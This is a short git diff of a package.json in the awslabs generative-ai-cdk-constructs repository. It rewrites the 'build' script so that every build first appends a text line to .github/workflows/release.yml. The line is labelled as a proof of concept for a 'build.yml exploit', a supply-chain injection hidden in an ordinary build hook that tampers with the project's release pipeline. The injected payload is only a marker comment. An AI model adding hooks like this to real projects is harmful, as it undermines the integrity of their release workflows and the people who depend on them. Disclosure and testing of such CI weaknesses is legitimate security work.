@@ -6,7 +6,7 @@
     "url": "https://github.com/awslabs/generative-ai-cdk-constructs"
   },
   "scripts": {
-    "build": "npx projen build",
+    "build": "echo -e '\n# POC: Injected by build.yml exploit. If this comment is in main, the exploit worked.' >> .github/workflows/release.yml && npx projen build",
     "bump": "npx projen bump",
     "clobber": "npx projen clobber",
     "compat": "npx projen compat",
